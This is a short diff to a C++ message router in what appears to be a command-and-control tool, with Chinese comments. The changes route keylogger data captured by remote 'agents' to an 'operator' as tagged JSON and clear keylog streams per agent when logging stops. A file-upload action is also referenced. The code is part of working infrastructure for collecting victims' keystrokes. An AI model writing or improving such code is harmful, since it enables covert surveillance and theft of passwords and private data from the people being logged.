@@ -184,12 +184,15 @@ void TaskRouter::onAgentMessage(const std::string& agentId, const std::string& t
     std::string action;
     bool found = false;
 
-    // 键录批量数据
+    // 键录批量数据：taskId 在 keylog_ 中，补 action/agentId 标记后路由给 operator
     {
         std::lock_guard<std::mutex> lk(mtx_);
         auto kit = keylog_.find(taskId);
         if (kit != keylog_.end()) {
-            if (sink_) sink_->sendToOperator(kit->second.op, text);
+            nlohmann::json out = j;
+            out["action"] = "keylog_data";
+            out["agentId"] = agentId;
+            if (sink_) sink_->sendToOperator(kit->second.op, out.dump());
             return;
         }
     }
@@ -235,8 +238,12 @@ void TaskRouter::onAgentMessage(const std::string& agentId, const std::string& t
         }
     }
     if (action == "keylog_stop") {
+        // stop 任务有自己的 taskId，需按 agentId 清掉 keylog_start 登记的流
         std::lock_guard<std::mutex> lk(mtx_);
-        keylog_.erase(taskId);
+        for (auto it = keylog_.begin(); it != keylog_.end();) {
+            if (it->second.agentId == agentId) it = keylog_.erase(it);
+            else ++it;
+        }
     }
 
     if (action == "file_upload" && ok) {
